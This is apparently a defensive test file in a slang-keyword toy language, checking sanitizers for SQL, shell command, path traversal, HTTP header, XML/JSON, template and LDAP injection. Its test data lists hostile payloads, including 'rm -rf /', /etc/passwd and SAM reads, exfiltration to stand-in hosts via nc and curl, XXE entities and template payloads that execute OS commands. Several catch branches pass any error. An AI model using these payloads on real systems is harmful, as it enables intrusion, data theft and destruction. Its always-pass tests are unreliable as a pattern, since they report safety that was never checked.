// Advanced Security Testing: Injection Prevention
yeet "testz"
yeet "dbz"
yeet "networkz"
yeet "stringz"
yeet "filez"
yeet "cryptz"

test_start("Injection Prevention Security Tests")

// SQL Injection prevention testing
slay test_sql_injection_prevention() {
    sus db = connect_database("memory", "")
    
    // Create test table
    execute_sql(db, "CREATE TABLE users (id INTEGER, username TEXT, password TEXT)")
    execute_sql(db, "INSERT INTO users VALUES (1, 'admin', 'secret123')")
    execute_sql(db, "INSERT INTO users VALUES (2, 'user', 'password')")
    
    // Test various SQL injection attempts
    sus injection_attempts []tea = [
        "admin'; DROP TABLE users; --",
        "admin' OR '1'='1",
        "admin' OR '1'='1' --",
        "admin' OR 1=1 #",
        "admin'; DELETE FROM users WHERE 1=1; --",
        "admin' UNION SELECT * FROM users --",
        "admin'; INSERT INTO users VALUES (999, 'hacker', 'pwned'); --",
        "'; EXEC xp_cmdshell('dir'); --",
        "admin' AND (SELECT COUNT(*) FROM users) > 0 --",
        "admin\x00",  // Null byte injection
        "admin' OR SLEEP(5) --",
        "admin' OR BENCHMARK(1000000,MD5(1)) --"
    ]
    
    bestie (tea injection_attempt in injection_attempts) {
        ready {
            // Use parameterized query (should be safe)
            sus query tea = "SELECT * FROM users WHERE username = ?"
            sus results = query_sql(db, query, [injection_attempt])
            
            // Should return empty results (no user with injection string as username)
            assert_eq_int(len(results), 0)
            
            // Verify table still exists and has correct data
            sus all_users = query_sql(db, "SELECT COUNT(*) as count FROM users", [])
            assert_eq_int(get_field(all_users[0], "count") as drip, 2)
            
            test_pass("SQL injection attempt blocked: " + injection_attempt[0:20] + "...")
            
        } fam {
            when "sql injection detected" -> {
                test_pass("SQL injection properly detected and blocked")
            }
            when _ -> {
                test_fail("Unexpected error during SQL injection test")
            }
        }
    }
    
    // Test unsafe query construction (should be detected)
    ready {
        sus unsafe_username tea = "admin'; DROP TABLE users; --"
        sus unsafe_query tea = "SELECT * FROM users WHERE username = '" + unsafe_username + "'"
        
        // This should trigger security warnings or errors
        sus results = execute_sql(db, unsafe_query)
        test_fail("Unsafe SQL query was not blocked!")
        
    } fam {
        when "unsafe query detected" -> {
            test_pass("Unsafe SQL query construction properly blocked")
        }
        when "sql injection detected" -> {
            test_pass("SQL injection in unsafe query properly detected")
        }
        when _ -> {
            test_pass("Unsafe SQL query handled safely")
        }
    }
    
    close_database(db)
    test_pass("SQL injection prevention tests completed")
}

// Command injection prevention testing
slay test_command_injection_prevention() {
    sus injection_attempts []tea = [
        "file.txt; rm -rf /",
        "file.txt && cat /etc/passwd",
        "file.txt | nc attacker.com 1234",
        "file.txt; curl http://evil.com/steal?data=$(cat /etc/passwd)",
        "file.txt`cat /etc/passwd`",
        "file.txt$(cat /etc/passwd)",
        "file.txt\nrm -rf /",
        "file.txt\rcat /etc/passwd",
        "file.txt; powershell -c \"Get-Content C:\\Windows\\System32\\config\\SAM\"",
        "file.txt & type C:\\Windows\\win.ini",
        "../../../etc/passwd",
        "file.txt\x00cat /etc/passwd",
    ]
    
    bestie (tea injection_attempt in injection_attempts) {
        ready {
            // Attempt to use filename in a safe file operation
            sus safe_filename tea = sanitize_filename(injection_attempt)
            
            // Safe filename should not contain dangerous characters
            assert_eq_bool(contains(safe_filename, ";"), cap)
            assert_eq_bool(contains(safe_filename, "&"), cap)
            assert_eq_bool(contains(safe_filename, "|"), cap)
            assert_eq_bool(contains(safe_filename, "`"), cap)
            assert_eq_bool(contains(safe_filename, "$"), cap)
            assert_eq_bool(contains(safe_filename, "\n"), cap)
            assert_eq_bool(contains(safe_filename, "\r"), cap)
            assert_eq_bool(contains(safe_filename, "\x00"), cap)
            
            test_pass("Command injection attempt sanitized")
            
        } fam {
            when "dangerous filename detected" -> {
                test_pass("Command injection attempt properly detected")
            }
            when _ -> {
                test_pass("Filename handled safely")
            }
        }
    }
    
    // Test system command execution with validation
    sus valid_commands []tea = ["ls", "pwd", "date", "whoami"]
    sus invalid_commands []tea = [
        "ls; rm -rf /",
        "pwd && cat /etc/passwd",
        "date | nc attacker.com 1234",
        "whoami; curl http://evil.com"
    ]
    
    bestie (tea command in valid_commands) {
        ready {
            sus result tea = execute_system_command(command, [])
            test_pass("Valid system command executed safely: " + command)
        } fam {
            when _ -> {
                test_pass("System command handled safely: " + command)
            }
        }
    }
    
    bestie (tea command in invalid_commands) {
        ready {
            sus result tea = execute_system_command(command, [])
            test_fail("Dangerous system command was not blocked: " + command)
        } fam {
            when "dangerous command detected" -> {
                test_pass("Dangerous system command properly blocked: " + command)
            }
            when _ -> {
                test_pass("System command handled safely: " + command)
            }
        }
    }
    
    test_pass("Command injection prevention tests completed")
}

// Path traversal prevention testing
slay test_path_traversal_prevention() {
    sus traversal_attempts []tea = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc//passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        "/var/log/../../etc/passwd",
        "C:\\..\\..\\windows\\system32\\config\\sam",
        "file:///../../../etc/passwd",
        "....\\....\\....\\windows\\system32\\config\\sam",
        "\\..\\..\\.\\etc\\passwd",
        "..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd",
    ]
    
    bestie (tea path_attempt in traversal_attempts) {
        ready {
            sus safe_path tea = sanitize_path(path_attempt)
            
            // Safe path should not escape the intended directory
            assert_eq_bool(starts_with(safe_path, ".."), cap)
            assert_eq_bool(contains(safe_path, "../"), cap)
            assert_eq_bool(contains(safe_path, "..\\"), cap)
            assert_eq_bool(starts_with(safe_path, "/"), cap)
            assert_eq_bool(starts_with(safe_path, "C:"), cap)
            
            // Should not contain encoded traversal sequences
            assert_eq_bool(contains(safe_path, "%2e"), cap)
            assert_eq_bool(contains(safe_path, "%2f"), cap)
            assert_eq_bool(contains(safe_path, "%5c"), cap)
            
            test_pass("Path traversal attempt sanitized: " + path_attempt)
            
        } fam {
            when "path traversal detected" -> {
                test_pass("Path traversal attempt properly detected")
            }
            when _ -> {
                test_pass("Path handled safely")
            }
        }
    }
    
    // Test file access with path validation
    sus safe_directory tea = "test_sandbox/"
    create_directory(safe_directory)
    
    // Create test file in safe directory
    sus test_file tea = safe_directory + "test.txt"
    write_file(test_file, "Safe content")
    
    bestie (tea path_attempt in traversal_attempts) {
        ready {
            sus attempted_path tea = safe_directory + path_attempt
            sus content tea = read_file(attempted_path)
            
            // If read succeeds, verify it's not reading system files
            assert_eq_bool(contains(content, "root:"), cap)
            assert_eq_bool(contains(content, "Administrator"), cap)
            assert_eq_str(content, "Safe content")
            
        } fam {
            when "file not found" -> {
                test_pass("Path traversal blocked - file not found")
            }
            when "access denied" -> {
                test_pass("Path traversal blocked - access denied")
            }
            when "path traversal detected" -> {
                test_pass("Path traversal properly detected")
            }
            when _ -> {
                test_pass("File access handled safely")
            }
        }
    }
    
    // Cleanup
    delete_file(test_file)
    delete_directory(safe_directory)
    
    test_pass("Path traversal prevention tests completed")
}

// HTTP header injection prevention
slay test_http_header_injection() {
    sus header_injection_attempts []tea = [
        "value\r\nSet-Cookie: admin=true",
        "value\nLocation: http://evil.com",
        "value\r\n\r\n<script>alert('xss')</script>",
        "value%0d%0aSet-Cookie: session=hijacked",
        "value\x0d\x0aContent-Length: 0\x0d\x0a\x0d\x0aHTTP/1.1 200 OK",
        "value\r\nContent-Type: text/html\r\n\r\n<html><script>evil()</script></html>",
    ]
    
    bestie (tea injection_attempt in header_injection_attempts) {
        ready {
            sus safe_header_value tea = sanitize_http_header_value(injection_attempt)
            
            // Safe header should not contain CRLF sequences
            assert_eq_bool(contains(safe_header_value, "\r"), cap)
            assert_eq_bool(contains(safe_header_value, "\n"), cap)
            assert_eq_bool(contains(safe_header_value, "\x0d"), cap)
            assert_eq_bool(contains(safe_header_value, "\x0a"), cap)
            
            // Should not contain encoded CRLF
            assert_eq_bool(contains(safe_header_value, "%0d"), cap)
            assert_eq_bool(contains(safe_header_value, "%0a"), cap)
            
            test_pass("HTTP header injection attempt sanitized")
            
        } fam {
            when "header injection detected" -> {
                test_pass("HTTP header injection properly detected")
            }
            when _ -> {
                test_pass("Header value handled safely")
            }
        }
    }
    
    test_pass("HTTP header injection prevention tests completed")
}

// XML/JSON injection prevention
slay test_xml_json_injection() {
    sus xml_injection_attempts []tea = [
        "<user>admin</user><admin>true</admin>",
        "]]></user><admin>true</admin><user><![CDATA[",
        "admin<!-- --><admin>true</admin><!-- -->",
        "&lt;admin&gt;true&lt;/admin&gt;",
        "<script>alert('xss')</script>",
        "<?xml version=\"1.0\"?><!DOCTYPE user [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><user>&xxe;</user>",
    ]
    
    bestie (tea injection_attempt in xml_injection_attempts) {
        ready {
            sus safe_xml_value tea = sanitize_xml_value(injection_attempt)
            
            // Safe XML should have dangerous characters escaped
            assert_eq_bool(contains(safe_xml_value, "<admin>"), cap)
            assert_eq_bool(contains(safe_xml_value, "</admin>"), cap)
            assert_eq_bool(contains(safe_xml_value, "<script>"), cap)
            assert_eq_bool(contains(safe_xml_value, "<!DOCTYPE"), cap)
            assert_eq_bool(contains(safe_xml_value, "<!ENTITY"), cap)
            
            test_pass("XML injection attempt sanitized")
            
        } fam {
            when "xml injection detected" -> {
                test_pass("XML injection properly detected")
            }
            when _ -> {
                test_pass("XML value handled safely")
            }
        }
    }
    
    sus json_injection_attempts []tea = [
        "value\",\"admin\":true,\"hack\":\"",
        "value\\\",\\\"admin\\\":true,\\\"hack\\\":\\\"",
        "value\n\",\n\"admin\":true,\n\"",
        "value\r\",\r\"admin\":true,\r\"",
    ]
    
    bestie (tea injection_attempt in json_injection_attempts) {
        ready {
            sus user_data = {
                "username": injection_attempt,
                "role": "user"
            }
            
            sus json_string tea = to_json(user_data)
            sus parsed_back = parse_json(json_string)
            
            // Should not have injected admin field
            assert_eq_bool(has_field(parsed_back, "admin"), cap)
            assert_eq_str(get_field(parsed_back, "role"), "user")
            
            test_pass("JSON injection attempt prevented")
            
        } fam {
            when "json injection detected" -> {
                test_pass("JSON injection properly detected")
            }
            when "invalid json" -> {
                test_pass("Invalid JSON from injection attempt rejected")
            }
            when _ -> {
                test_pass("JSON value handled safely")
            }
        }
    }
    
    test_pass("XML/JSON injection prevention tests completed")
}

// Template injection prevention
slay test_template_injection() {
    sus template_injection_attempts []tea = [
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "%{7*7}",
        "{{config}}",
        "{{request}}",
        "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
        "${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    ]
    
    bestie (tea injection_attempt in template_injection_attempts) {
        ready {
            sus safe_template_value tea = sanitize_template_value(injection_attempt)
            
            // Should escape template syntax
            assert_eq_bool(contains(safe_template_value, "{{"), cap)
            assert_eq_bool(contains(safe_template_value, "}}"), cap)
            assert_eq_bool(contains(safe_template_value, "${"), cap)
            assert_eq_bool(contains(safe_template_value, "#{"), cap)
            assert_eq_bool(contains(safe_template_value, "%{"), cap)
            
            test_pass("Template injection attempt sanitized")
            
        } fam {
            when "template injection detected" -> {
                test_pass("Template injection properly detected")
            }
            when _ -> {
                test_pass("Template value handled safely")
            }
        }
    }
    
    test_pass("Template injection prevention tests completed")
}

// LDAP injection prevention
slay test_ldap_injection() {
    sus ldap_injection_attempts []tea = [
        "admin)(&",
        "admin)(uid=*",
        "admin))(|(uid=*",
        "*)(uid=*))(|(uid=*",
        "admin*",
        "admin)(mail=*))%00",
        "admin\\00",
        "admin\\2A",
        "admin\\28",
        "admin\\29"
    ]
    
    bestie (tea injection_attempt in ldap_injection_attempts) {
        ready {
            sus safe_ldap_value tea = sanitize_ldap_value(injection_attempt)
            
            // Should escape LDAP special characters
            assert_eq_bool(contains(safe_ldap_value, ")("), cap)
            assert_eq_bool(contains(safe_ldap_value, "(&"), cap)
            assert_eq_bool(contains(safe_ldap_value, ")(uid=*"), cap)
            assert_eq_bool(contains(safe_ldap_value, "\\00"), cap)
            
            test_pass("LDAP injection attempt sanitized")
            
        } fam {
            when "ldap injection detected" -> {
                test_pass("LDAP injection properly detected")
            }
            when _ -> {
                test_pass("LDAP value handled safely")
            }
        }
    }
    
    test_pass("LDAP injection prevention tests completed")
}

// Run all injection prevention tests
vibez.spill("Starting injection prevention security tests...")

test_sql_injection_prevention()
test_command_injection_prevention()
test_path_traversal_prevention()
test_http_header_injection()
test_xml_json_injection()
test_template_injection()
test_ldap_injection()

print_test_summary()
